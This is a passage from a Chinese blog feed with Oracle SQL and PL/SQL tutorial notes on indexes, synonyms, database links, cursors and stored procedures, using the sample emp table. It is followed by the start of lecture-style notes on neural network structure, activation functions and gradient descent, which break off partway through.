id="索引">索引</h2><p><strong>索引(INDEX)是为了加快数据的查找而创建的数据库对象，特别是对大表，索引可以有效地提高查找速度，也可以保证数据的惟一性</strong></p><p><strong>创建索引一般要掌握以下原则：只有较大的表才有必要建立索引，表的记录应该大于50条，查询数据小于总行数的2%～4%。虽然可以为表创建多个索引，但是无助于查询的索引不但不会提高效率，还会增加系统开销。因为当执行DML操作时，索引也要跟着更新，这时索引可能会降低系统的性能。</strong></p><p>创建索引：</p><pre><code> CREATE INDEX 索引名 ON 表名(列名);</code></pre><p>删除索引：</p><pre><code>  DROP INDEX 索引名；</code></pre><h2 id="同义词">同义词</h2><p><strong>同义词(SYNONYM)是为模式对象起的别名，可以为表、视图、序列、过程、函数和包等数据库模式对象创建同义词。</strong></p><p>创建私有同义词：</p><pre><code>  CREATE SYNONYM BOOK FOR 图书；</code></pre><p>创建公有同义词(先要获得创建公有同义词的权限)：</p><pre><code>  CREATE PUBLIC SYNONYM BOOK FOR SCOTT.图书；</code></pre><p>删除同义词：</p><pre><code>DROP SYNONYM 同义词名；</code></pre><h2 id="数据库链接">数据库链接</h2><p><strong>数据库链接(DATABASE LINK)是在分布式环境下，为了访问远程数据库而创建的数据通信链路。</strong></p><p>格式：</p><pre><code> CREATE DATABASE LINK 链接名 CONNECT TO 账户 IDENTIFIED BY 口令 USING 服务名;</code></pre><p>数据库链接一旦建立并测试成功，就可以使用以下形式来访问远程用户的表。</p><pre><code>表名@数据库链接名</code></pre><h2 id="pl-sql">PL/sql</h2><h3 id="1-块结构和基本语法要求">1、块结构和基本语法要求</h3><p>块中各部分的作用解释如下：</p><pre><code>(1)  DECLARE：声明部分标志。(2)  BEGIN：可执行部分标志。(3)  EXCEPTION：异常处理部分标志。(4)  END；：程序结束标志。</code></pre><h3 id="2-输出">2、输出</h3><p>第一种形式：</p><pre><code>DBMS_OUTPUT.PUT(字符串表达式)；</code></pre><p>第二种形式：</p><pre><code>DBMS_OUTPUT.PUT_LINE(字符串表达式)；</code></pre><p>第三种形式：</p><pre><code>DBMS_OUTPUT.NEW_LINE；</code></pre><h3 id="3-变量赋值：">3、变量赋值：</h3><p>第一种形式：</p><pre><code>SELECT 列名1，列名2... INTO 变量1，变量2... FROM 表名 WHERE 条件；第二种形式：变量名:=值</code></pre><p>例：查询雇员编号为7788的雇员姓名和工资。</p><pre><code>SET SERVEROUTPUT ON--在命令行界面必须写DECLARE--定义部分标识 v_name  VARCHAR2(10);--定义字符串变量v_name v_sal   NUMBER(5);--定义数值变量v_salBEGIN--可执行部分标识SELECT ename,sal INTO v_name,v_sal  FROM emp  WHERE empno=7788;--在程序中插入的SQL语句DBMS_OUTPUT.PUT_LINE('7788号雇员是：'||v_name||'，工资为：'||to_char(v_sal));--输出雇员名和工资END;</code></pre><h3 id="4-结合变量的定义和使用-即全局变量">4、结合变量的定义和使用（即全局变量）</h3><p><em><em>该变量是在整个SQL</em>Plus环境下有效的变量，在退出SQL</em>Plus之前始终有效，所以可以使用该变量在不同的程序之间传递信息。结合变量不是由程序定义的，而是使用系统命令VARIABLE定义的。**</p><p>例：定义并使用结合变量</p><p>步骤1：输入和执行下列命令，定义结合变量g_ename：</p><pre><code>--SET SERVEROUTPUT ON VARIABLE  g_ename VARCHAR2(100)BEGIN:g_ename:=:g_ename|| 'Hello~ ';--在程序中使用结合变量DBMS_OUTPUT.PUT_LINE(:g_ename);                --输出结合变量的值END;</code></pre><h3 id="5-记录变量的定义">5．记录变量的定义</h3><p><strong>还可以根据表或视图的一个记录中的所有字段定义变量，称为记录变量。记录变量包含若干个字段，在结构上同表的一个记录相同，定义方法是在表名后跟%ROWTYPE。记录变量的字段名就是表的字段名，数据类型也一致。</strong></p><p>如：</p><pre><code> v_name emp.ename%TYPE;</code></pre><h1>Oracle第十三章——PL/SQL空值语句、游标</h1><h2 id="if语句">IF语句</h2><h3 id="1-if-then-end-if形式">1、IF-THEN-END IF形式</h3><pre>   IF 条件 then        语句集;   END IF;</pre><h3 id="2-if-then-else-end-if形式">2、IF-THEN-ELSE-END IF形式</h3><pre>   IF 条件 then        语句集1;   ElSE       语句集2   END IF;</pre><h3 id="3-if-then-elsif-else-end-if形式">3．IF-THEN-ELSIF-ELSE-END IF形式</h3><pre>   IF 条件1 THEN语句集1;   ELSIF 条件2 THEN语句集2;   ELSIF 条件3 THEN语句集3;   ...   ELSE语句集n;   END IF;</pre><h2 id="case语句">CASE语句</h2><h3 id="1-基本case结构">1．基本CASE结构</h3><pre>   CASE 变量或表达式   When 值1 then 结果1;   When 值2 then 结果2;   When 值3 then 结果3;   ...   ELSE 结果n;   END CASE;</pre><h3 id="2-搜索case结构">2.搜索CASE结构</h3><pre>  CASE    When 条件1 then 结果1;   When 条件2 then 结果2;   When 条件3 then 结果3;   ...   ELSE 结果n;   END CASE;</pre><h2 id="循环">循环</h2><h3 id="1-基本loop循环">1．基本LOOP循环</h3><pre>   loop      语句集;   exit when 条件      语句集;   end loop;</pre><h3 id="2-for-loop循环">2.FOR LOOP循环</h3><p>FOR循环是固定次数循环，格式如下：</p><pre>FOR 控制变量 in [REVERSE] 下限..上限 LOOP   语句集;  END LOOP;</pre><p><em>注：循环控制变量是隐含定义的，不需要声明。</em></p><p><strong>下限和上限用于指明循环次数。正常情况下循环控制变量的取值由下限到上限递增，REVERSE关键字表示循环控制变量的取值由上限到下限递减。</strong></p><h2 id="3-while-loop循环">3．WHILE LOOP循环</h2><pre>   while 条件 loop       语句集;   end loop;</pre><h2 id="游标">游标</h2><h3 id="1-概念">1、概念</h3><p><strong>游标是SQL的一个内存工作区，由系统或用户以变量的形式定义。游标的作用就是用于临时存储从数据库中提取的数据块。在某些情况下，需要把数据从存放在磁盘的表中调到计算机内存中进行处理，最后将处理结果显示出来或最终写回数据库。这样数据处理的速度才会提高，否则频繁的磁盘数据交换会降低效率。</strong></p><p>游标有两种类型：显式游标和隐式游标。</p><p>在前述程序中用到的SELECT…INTO…查询语句，一次只能从数据库中提取一行数据，系统都会使用一个隐式游标。</p><p>显式游标对应一个返回结果为多行多列的SELECT语句。</p><p>游标一旦打开，数据就从数据库中传送到游标变量中，然后应用程序再从游标变量中分解出需要的数据，并进行处理。</p><h3 id="2-隐式游标属性">2、隐式游标属性</h3><table><thead><tr><th>隐式游标的属性</th><th>返回值类型</th><th>意义</th></tr></thead><tbody><tr><td>SQL%ROWCOUNT</td><td>整型</td><td>代表DML语句成功执行的数据行数</td></tr><tr><td>SQL%FOUND</td><td>布尔型</td><td>值为TRUE代表插入、删除、更新或单行查询操作成功</td></tr><tr><td>SQL%NOTFOUND</td><td>布尔型</td><td>与SQL%FOUND属性返回值相反</td></tr><tr><td>SQL%ISOPEN</td><td>布尔型</td><td>DML执行过程中为真，结束后为假</td></tr></tbody></table><p>如：使用隐式游标的属性，判断对雇员工资的修改是否成功。</p><pre><code>SET SERVEROUTPUT ON BEGIN  UPDATE emp SET sal=sal+100 WHERE empno=1234; IF SQL%FOUND THEN  DBMS_OUTPUT.PUT_LINE('成功修改雇员工资！');  COMMIT;  ELSEDBMS_OUTPUT.PUT_LINE('修改雇员工资失败！'); END IF; END;</code></pre><h3 id="3-显式游标">3、显式游标</h3><p>游标的使用分成以下4个步骤。</p><h4 id="a-声明游标">a．声明游标</h4><p>在DECLEAR部分按以下格式声明游标：</p><pre><code>CURSOR 游标名[(参数1 数据类型[，参数2 数据类型...])] IS SELECT语句;</code></pre><p>参数是可选部分，所定义的参数可以出现在SELECT语句的WHERE子句中。如果定义了参数，则必须在打开游标时传递相应的实际参数。</p><h4 id="b-打开游标">b.打开游标</h4><p>在可执行部分，按以下格式打开游标：</p><pre><code>OPEN 游标名[(实际参数1[，实际参数2...])];</code></pre><p>打开游标时，SELECT语句的查询结果就被传送到了游标工作区。</p><h4 id="c-提取数据">c.提取数据</h4><p>在可执行部分，按以下格式将游标工作区中的数据取到变量中。提取操作必须在打开游标之后进行。</p><pre><code>FETCH 游标名 INTO 变量名1[，变量名2...];</code></pre><p>或</p><pre><code>FETCH 游标名 INTO 记录变量;</code></pre><p>游标打开后有一个指针指向数据区，FETCH语句一次返回指针所指的一行数据，要返回多行需重复执行，可以使用循环语句来实现。控制循环可以通过判断游标的属性来进行。</p><p>定义记录变量的方法如下：</p><pre><code>     变量名 表名|游标名%ROWTYPE；</code></pre><h4 id="d-关闭游标">d.关闭游标</h4><pre><code>CLOSE 游标名;</code></pre><p>显式游标打开后，必须显式地关闭。游标一旦关闭，游标占用的资源就被释放，游标变成无效，必须重新打开才能使用。</p><p>【例1】 用游标提取emp表中7788雇员的名称和职务。</p><pre><code>SET SERVEROUTPUT ON     --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句DECLARE    v_ename VARCHAR2(10);    v_job VARCHAR2(10);    CURSOR emp_cursor IS  SELECT ename,job FROM emp WHERE empno=7788;BEGIN    OPEN emp_cursor;    FETCH emp_cursor INTO v_ename,v_job;    DBMS_OUTPUT.PUT_LINE(v_ename||','||v_job);    CLOSE emp_cursor;END;</code></pre><p>【例2】  用游标提取emp表中7788雇员的姓名、职务和工资。</p><pre><code>SET SERVEROUTPUT ON     --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句DECLARE CURSOR emp_cursor IS  SELECT ename,job,sal FROM emp WHERE empno=7788;emp_record emp_cursor%ROWTYPE;    --用游标定义记录变量BEGIN OPEN emp_cursor;FETCH emp_cursor INTO emp_record;   DBMS_OUTPUT.PUT_LINE(emp_record.ename||','|| emp_record.job||','|| emp_record.sal); CLOSE emp_cursor;END;</code></pre><p>【例3】  显示工资最高的前3名雇员的名称和工资。</p><pre><code>SET SERVEROUTPUT ON   --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句DECLARE V_ename VARCHAR2(10);V_sal NUMBER(5);CURSOR emp_cursor IS  SELECT ename,sal FROM emp ORDER BY sal DESC;BEGIN OPEN emp_cursor; FOR I IN 1..3 LOOP   FETCH emp_cursor INTO v_ename,v_sal; DBMS_OUTPUT.PUT_LINE(v_ename||','||v_sal);  END LOOP;   CLOSE emp_cursor;END;</code></pre><h3 id="4-游标循环-重点">4、游标循环（重点）</h3><p>方法一：使用特殊的FOR循环形式显示全部雇员的编号和名称(省略掉定义记录变量、打开游标、提取数据、关闭游标)。</p><pre><code>SET SERVEROUTPUT ON     --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句DECLARE CURSOR emp_cursor IS  SELECT empno, ename FROM emp;BEGINFOR Emp_record IN emp_cursor LOOP    DBMS_OUTPUT.PUT_LINE(Emp_record.empno|| Emp_record.ename);END LOOP;END;</code></pre><p>方法二：最简单方式</p><pre><code>SET SERVEROUTPUT ON      --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句BEGIN FOR re IN (SELECT ename FROM EMP)  LOOPDBMS_OUTPUT.PUT_LINE(re.ename)END LOOP;END;</code></pre><h3 id="5-利用游标属性做循环条件">5、利用游标属性做循环条件</h3><p>【训练1】  使用游标的属性练习。</p><pre><code>SET SERVEROUTPUT ON         --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句DECLARE  V_ename VARCHAR2(10);  CURSOR emp_cursor IS   SELECT ename FROM emp;BEGIN  OPEN emp_cursor;   IF emp_cursor%ISOPEN THEN  LOOP    FETCH emp_cursor INTO v_ename;            EXIT WHEN emp_cursor%NOTFOUND;    DBMS_OUTPUT.PUT_LINE(to_char(emp_cursor%ROWCOUNT)||'-'||v_ename);        END LOOP;  ELSE    DBMS_OUTPUT.PUT_LINE('用户信息：游标没有打开！');  END IF;           CLOSE  emp_cursor;END;</code></pre><h1>Oracle第十四章——游标、存储过程</h1><h2 id="游标参数的传递">游标参数的传递</h2><p>例：</p><pre><code>SET SERVEROUTPUT ONDECLARE    V_empno NUMBER(5);V_ename VARCHAR2(10);CURSOR emp_cursor(p_deptno NUMBER,p_job VARCHAR2) IS SELECT empno,ename FROM emp WHEREdeptno = p_deptno AND job = p_job;BEGIN OPEN emp_cursor(10, 'CLERK');  LOOP     FETCH emp_cursor INTO v_empno,v_ename;  EXIT WHEN emp_cursor%NOTFOUND;     DBMS_OUTPUT.PUT_LINE(v_empno||','||v_ename);END LOOP;END; </code></pre><h2 id="异常处理">异常处理</h2><p>错误处理的语法如下：</p><pre><code>     EXCEPTIONWHEN 错误1[OR 错误2] THEN 语句序列1;WHEN 错误3[OR 错误4] THEN 语句序列2;...WHEN OTHERS 语句序列n;      END;</code></pre><p>例：SET SERVEROUTPUT ON</p><pre><code>DECLARE    v_name VARCHAR2(10);BEGIN    SELECTename  INTO v_name  FROM emp  WHEREempno = 1234;DBMS_OUTPUT.PUT_LINE('该雇员名字为：'|| v_name);EXCEPTIONWHEN NO_DATA_FOUND THENDBMS_OUTPUT.PUT_LINE('编号错误，没有找到相应雇员！');WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE('发生其他错误！');END;</code></pre><h2 id="存储过程">存储过程</h2><h3 id="创建和删除存储过程">创建和删除存储过程</h3><p>格式：</p><pre><code> CREATE [OR REPLACE] PROCEDURE 存储过程名[(参数[IN|OUT|IN OUT] 数据类型...)]{AS|IS}[说明部分]   --定义需要使用的临时变量BEGIN语句集;[EXCEPTION]    [错误处理部分]END [过程名];</code></pre><p>删除：</p><pre><code>drop procedure 存储过程名;</code></pre><h3 id="调用存储过程">调用存储过程</h3><p>方法1：</p><pre><code>  EXECUTE 模式名.存储过程名[(参数...)];   (适用于命今行窗口及sql窗口)</code></pre><p>方法2： (适用于sql窗口)</p><pre><code>BEGIN      模式名.存储过程名[(参数...)];END;</code></pre><p>例：编写显示雇员信息的存储过程EMP_LIST，并引用EMP_COUNT存储过程(无参存储过程 )。</p><pre><code>CREATE OR REPLACE PROCEDURE EMP_LISTAS       CURSOR emp_cursor IS SELECT empno,ename FROM emp;BEGINFOR Emp_record IN emp_cursor LOOP   DBMS_OUTPUT.PUT_LINE(Emp_record.empno||Emp_record.ename);END LOOP;EMP_COUNT;END;调用：beginEMP_LIST;          end;</code></pre><h3 id="参数传递">参数传递</h3><p>a.输入参数: 参数名  IN 数据类型 DEFAULT 值；</p><pre><code>例：编写给雇员增加工资的存储过程CHANGE_SALARY，通过IN类型的参数传递要增加工资的雇员编号和增加的工资额。CREATE OR REPLACE PROCEDURE CHANGE_SALARY(P_EMPNO IN NUMBER DEFAULT 7788,P_RAISE NUMBER DEFAULT 10)  --形参P_EMPNO及P_RAISEAS   V_ENAME VARCHAR2(10);   V_SAL NUMBER(5);BEGIN   SELECT ENAME,SAL INTO V_ENAME,V_SAL FROM EMP WHERE EMPNO=P_EMPNO;   UPDATE EMP SET SAL=SAL+P_RAISE WHERE EMPNO=P_EMPNO;   DBMS_OUTPUT.PUT_LINE('雇员'||V_ENAME||'的工资被改为'||TO_CHAR(V_SAL+P_RAISE));   COMMIT;EXCEPTION  WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE('发生错误，修改失败！');  ROLLBACK; --如果出了异常则撤消END;调用：beginCHANGE_SALARY(7788,80)      end;</code></pre><p>b.输出参数: 参数名 OUT 数据类型 DEFAULT  值；</p><pre><code>    --例：统计雇员的人数       CREATE OR REPLACE PROCEDURE EMP_COUNT(P_TOTAL OUT NUMBER)   --P_TOTAL为输出参数AS   BEGINSELECT COUNT(*) INTO P_TOTAL FROM EMP;   END;调用：DECLARE V_EMPCOUNT NUMBER;   --定义变量接收过程求出的结果      BEGIN EMP_COUNT(V_EMPCOUNT); DBMS_OUTPUT.PUT_LINE('雇员总人数为：'||V_EMPCOUNT);      END;</code></pre><p>c.输入输出参数： 参数名  IN OUT   数据类型   DEFAULT   值；</p><pre><code>--例：使用IN OUT类型的参数，给电话号码增加区码。CREATE OR REPLACE PROCEDURE ADD_REGION(P_HPONE_NUM IN OUT VARCHAR2)ASBEGIN   P_HPONE_NUM:='024-'||P_HPONE_NUM;END;调用： DECLARE V_PHONE_NUM VARCHAR2(15);       BEGIN V_PHONE_NUM:='26731092'; ADD_REGION(V_PHONE_NUM); DBMS_OUTPUT.PUT_LINE('新的电话号码：'||V_PHONE_NUM);       END;</code></pre><p><br><br>本文链接： <a href="http://home.meng.uno/articles/33c755f8/">http://home.meng.uno/articles/33c755f8/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Oracle第一章
 1. 首先打开Oracle服务
 2. 配置监听器（这个是因为教室的电脑Oracle安装有问题，没有配置好监听器）开始菜单中找到net configration assistant添加一个监听器
 3. 用system用户登录sqlplus
 4. 解锁scott用户 :（也是因为教室的Oracle安装问题导致scott账户未解锁）

1


alter user scott account unlock;


 5. 修改scott密码:

1


alter user scott identified by tiger;


 6. 使用scott登录sqlplus,
    
    </summary>
    
      <category term="Database" scheme="http://home.meng.uno/categories/Database/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="Oracle" scheme="http://home.meng.uno/tags/Oracle/"/>
    
  </entry>
  
  <entry>
    <title>深度学习总结</title>
    <link href="http://home.meng.uno/articles/8193f764/"/>
    <id>http://home.meng.uno/articles/8193f764/</id>
    <published>2018-04-04T04:29:41.000Z</published>
    <updated>2020-12-02T01:39:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1>1. 神经网络的结构</h1><p>内容：</p><ul>  <li>神经网络是什么？</li>  <li>神经网络的结构</li>  <li>神经网络的工作机制</li>  <li>深度学习中的“学习”指的是什么？</li>  <li>神经网络的不足</li></ul><p><strong>示例：一个用于数字手写识别的神经网络</strong></p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180701210407.png" alt=""></p><blockquote>  <p>这个示例相当于深度学习领域中的 “Hello World”.</p></blockquote><h2 id="1-1-神经元-隐藏单元-与隐藏层">1.1. 神经元（隐藏单元）与隐藏层</h2><p><strong>神经元（隐藏单元）</strong></p><ul>  <li>    <p>简单来说，神经元可以理解为一个用来装数字的容器，而这个数称为激活值</p>    <p>需要强调的是，激活值的值域取决于使用的激活函数，大多数激活函数的值域都是<strong>正值</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180701211429.png" alt=""></p>  </li></ul><blockquote>  <p>如果使用 sigmoid 激活函数，那么这个数字就在 0 到 1 之间；但通常来说，无论你使用哪种激活函数，这个数字都比较小</p></blockquote><ul>  <li>    <p>输入层也可以看做是一组神经元，它的激活值就是输入本身</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180701211850.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180701214914.png" alt=""></p>    <blockquote>      <p>基本的神经网络只能处理向量型的输入，所以需要将这个 28*28 的像素图（矩阵），重排成长为 784 的向量</p>      <p>如果使用卷积神经网络，则可以直接处理矩阵型的输入</p>    </blockquote>  </li>  <li>    <p>对于分类问题，<strong>输出层</strong>中的激活值代表这个类别正确的可能性</p>    <blockquote>      <p>如果使用了 <code>softmax</code> 函数，那么整个输出层可以看作每个类别的概率分布</p>    </blockquote>  </li>  <li>    <p>所谓的“<strong>神经元被激活</strong>”实际上就是它获得了一个较大的激活值</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180701212340.png" alt=""></p>  </li></ul><p><strong>隐藏层</strong></p><ul>  <li>    <p>包含于输入层与输出层之间的网络层统称为“隐藏层”</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180701212657.png" alt=""></p>  </li></ul><blockquote>  <p>在这个简单的网络中，有两个隐藏层，每层有 16 个神经元</p>  <p>为什么是两层和 16 个？——层数的大小与问题的复杂度有关，而神经元的数量目前来看是随机的——网络的结构在实验时有很大的调整余地</p></blockquote><h2 id="1-2-神经网络的运作机制">1.2. 神经网络的运作机制</h2><ul>  <li>    <p>神经网络在运作的时候，隐藏层可以视为一个“黑箱”</p>  </li>  <li>    <p>每一层的激活值将通过某种方式计算出下一层的激活值——神经网络处理信息的核心机制</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180701213151.png" alt=""></p>    <blockquote>      <p>每一层被激活的神经元不同，（可能）会导致下一层被激活的神经元也不同</p>    </blockquote>  </li></ul><p><strong>为什么神经网络的分层结构能起作用？</strong></p><ul>  <li>    <p>人在初识数字时是如何区分的？——<strong>组合</strong>数字的各个部分</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702092532.png" alt=""></p>  </li>  <li>    <p><strong>在理想情况下</strong>，我们希望神经网络倒数第二层中的各隐藏单元能对应上每个<strong>基本笔画</strong>（pattern）</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702093050.png" alt=""></p>    <ul>      <li>当输入是 9 或 8 这种<strong>顶部带有圆圈</strong>的数字时，某个神经元将被激活（激活值接近 1）</li>      <li>不光是 9 和 8，所有顶部带有圆圈的图案都能激活这个隐藏单元</li>      <li>这样从倒数第二层到输出层，我们的问题就简化成了“学习哪些部件能组合哪些数字”</li>    </ul>  </li>  <li>    <p>类似的，基本笔画也可以由更基础的部件构成</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702094246.png" alt=""></p>  </li>  <li>    <p><strong>理想情况下</strong>，神经网络的处理过程</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702094455.png" alt=""></p>    <blockquote>      <p>从输入层到输出层，<strong>网络的抽象程度越来越高</strong></p>    </blockquote>  </li></ul><p><strong>深度学习的本质：通过组合简单的概念来表达复杂的事物</strong></p><ul>  <li>    <p>神经网络是不是这么做的，我们不得而知（所以是一个“黑箱”），但大量实验表明：神经网络确实在做类似的工作——<strong>通过组合简单的概念来表达复杂的事物</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702095428.png" alt=""></p>    <blockquote>      <p>语音识别：原始音频 → 音素 → 音节 → 单词</p>    </blockquote>  </li></ul><p><strong>隐藏单元是如何被激活的？</strong></p><ul>  <li>我们需要设计一个机制，这个机制能够把像素拼成边，把边拼成基本图像，把基本图像拼成数字</li>  <li>这个机制的基本处理方式是：通过上一层的单元激活下一层的单元</li></ul><p><strong>示例：如何使第二层的单个神经元识别出图像中的某块区域是否存在一条边</strong></p><ul>  <li>    <p>根据激活的含义，当激活值接近 1 时，表示该区域存在一条边，反之不存在</p>  </li>  <li>    <p><strong>怎样的数学公式能够表达出这个含义？</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702112135.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702113031.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702113631.png" alt=""></p>    <ul>      <li>        <p>考虑对所有输入单元加权求和</p>      </li>      <li>        <p>图中每条连线关联一个权值：绿色表示正值，红色表示负值，颜色越暗表示越接近 0</p>      </li>      <li>        <p>此时，只需将需要关注的像素区域对应的权值设为正，其余为 0</p>      </li>      <li>        <p>这样对所有像素的加权求和就只会累计我们关注区域的像素值</p>      </li>      <li>        <p>为了使隐藏单元真正被“激活”，加权和还需要经过某个<strong>非线性函数</strong>，也就是“激活函数”</p>      </li>      <li>        <p>早期最常用的激活函数是 <code>sigmoid</code> 函数（又称 logistic/逻辑斯蒂曲线）</p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702114132.png" alt=""></p>        <blockquote>          <p>从 <code>sigmoid</code> 的角度看，它实际上在对加权和到底有多“正”进行打分</p>        </blockquote>      </li>      <li>        <p>但有时，可能加权和大于 10 时激活才有意义；</p>      </li>      <li>        <p>此时，需要加上“偏置”，保证不能随便激发，比如 -10。然后再传入激活函数</p>      </li>    </ul>  </li></ul><h3 id="1-2-1-权重和偏置">1.2.1. 权重和偏置</h3><ul>  <li>    <p>每个隐藏单元都会和<strong>上一层的所有单元</strong>相连，每条连线上都关联着一个<strong>权重</strong>；</p>  </li>  <li>    <p>每个隐藏单元又会各自带有一个<strong>偏置</strong></p>    <blockquote>      <p>偏置和权重统称为网络参数</p>    </blockquote>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702150309.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702151423.png" alt=""></p>    <blockquote>      <p>每一层都带有自己的权重与偏置，这样一个小小的网络，就有 13002 个参数</p>    </blockquote>  </li></ul><p><strong>权重与偏置的实际意义</strong></p><ul>  <li>    <p>宏观来看，<strong>权重</strong>在告诉你当前神经元应该更关注来自上一层的哪些单元；或者说<strong>权重指示了连接的强弱</strong></p>  </li>  <li>    <p><strong>偏置</strong>则告诉你加权和应该多大才能使神经元的激发变得有意义；或者说<strong>当前神经元是否更容易被激活</strong></p>  </li></ul><p><strong>矢量化编程</strong></p><ul>  <li>    <p>把一层中所有的激活值作为一列<strong>向量</strong> <code>a</code></p>  </li>  <li>    <p>层与层之间的权重放在一个<strong>矩阵</strong> <code>W</code> 中：第 n 行就是上层所有神经元与下层第 n 个神经元的权重</p>  </li>  <li>    <p>类似的，所有偏置也作为一列<strong>向量</strong> <code>b</code></p>  </li>  <li>    <p>最后，将 <code>Wa + b</code> 一起传入激活函数</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702155142.png" alt=""></p>    <blockquote>      <p><code>sigmoid</code>会对结果向量中的每个值都取一次<code>sigmoid</code></p>    </blockquote>  </li>  <li>    <p>所谓“矢量化编程”，实际上就是将向量作为基本处理单元，避免使用 for 循环处理标量</p>  </li>  <li>    <p>通过定制处理单元（GPU运算），可以大幅加快计算速度</p>  </li></ul><p><strong>机器“学习”的实质</strong></p><p>当我们在讨论机器如何“学习”时，实际上指的是机器如何正确设置这些参数</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702152216.png" alt=""></p><h2 id="1-3-非线性激活函数">1.3. 非线性激活函数</h2><p><strong>神经网络本质上是一个函数</strong></p><ul>  <li>    <p>每个神经元可以看作是一个函数，其输入是上一层所有单元的输出，然后输出一个激活值</p>  </li>  <li>    <p>宏观来看，神经网络也是一个函数</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702151423.png" alt=""></p>    <blockquote>      <p>一个输入 784 个值，输出 10 个值的函数；其中有 13000 个参数</p>    </blockquote>  </li>  <li>    <p>早期最常用的激活函数是 <code>sigmoid</code> 函数，它是一个<strong>非线性函数</strong></p>  </li>  <li>    <p>暂不考虑它其他优秀的性质（使其长期作为激活函数的首选）以及缺点（使其逐渐被弃用）；</p>    <p>而只考虑其<strong>非线性</strong></p>  </li></ul><p><strong>为什么要使用非线性激活函数？——神经网络的万能近似定理</strong></p><blockquote>  <p>视频中没有提到为什么使用非线性激活函数，但这确实是神经网络能够具有如此强大<strong>表示能力</strong>的关键</p></blockquote><ul>  <li>使用<strong>非线性激活函数</strong>的目的是为了向网络中加入<strong>非线性因素</strong>，从而加强网络的表示能力</li></ul><p><strong>为什么加入非线性因素能够加强网络的表示能力？</strong></p><ul>  <li>    <p>首先要有这样一个认识，非线性函数具有比线性函数更强的表示能力。</p>  </li>  <li>    <p>如果不使用非线性激活函数，那么每一层输出都是上层输入的线性组合；</p>    <p>容易验证，此时无论有多少层，神经网络都只是一个线性函数。</p>  </li></ul><p><strong>万能近似定理</strong></p><ul>  <li>神经网络如果具有至少一个非线性输出层，那么只要给予网络足够数量的隐藏单元，它就可以以任意的精度来近似任何从一个有限维空间到另一个有限维空间的函数。</li>  <li>这极大的扩展了神经网络的表示空间</li></ul><p><strong>新时代的激活函数——线性整流单元 ReLU</strong></p><p>这里简单说下 sigmoid 的问题：</p><ul>  <li>    <p><code>sigmoid</code> 函数在输入取绝对值非常大的正值或负值时会出现<strong>饱和现象</strong>，此时函数会对输入的微小改变会变得不敏感</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702114132.png" alt=""></p>    <blockquote>      <p>饱和现象：在图像上表现为函数值随自变量的变化区域平缓（斜率接近 0）</p>    </blockquote>  </li>  <li>    <p>饱和现象会导致<strong>基于梯度的学习</strong>变得困难，并在传播过程中丢失信息（<strong>梯度消失</strong>）</p>  </li></ul><p><strong>线性整流单元 ReLU</strong></p><p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180702171411.png" alt=""></p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180702171146.png" alt=""></p><ul>  <li>    <p><code>ReLU</code> 取代 <code>sigmoid</code> 的主要原因就是：使神经网络更容易训练（<strong>减缓梯度消失</strong>）</p>  </li>  <li>    <p>此外，一种玄学的说法是，早期引入 <code>sigmoid</code> 的原因之一就是为了模仿生物学上神经元的激发</p>    <p>而 <code>ReLU</code> 比 <code>sigmoid</code> 更接近这一过程。</p>  </li></ul><h1>2. 梯度下降法</h1><p>内容：</p><ul>  <li>梯度下降的思想</li>  <li>网络的能力分析</li>  <li>隐层神经元的真实目的</li></ul><p>网络示例依然是那个手写识别的例子：</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180701210407.png" alt=""></p><p><strong>神经网络是怎样学习的？</strong></p><ul>  <li>    <p>我们需要一种算法：通过喂给这个网络大量的<strong>训练数据</strong>——不同的手写数字图像以及对应的数字标签</p>    <p>算法会调整所有网络参数（权重和偏置）来提高网络对训练数据的表现</p>    <p>此外，我们还希望这种分层结构能够举一反三，识别训练数据之外的图像——<strong>泛化能力</strong></p>  </li>  <li>    <p>虽然使用了“学习”的说法，但实际上训练的过程更像在解一道<strong>微积分问题</strong></p>    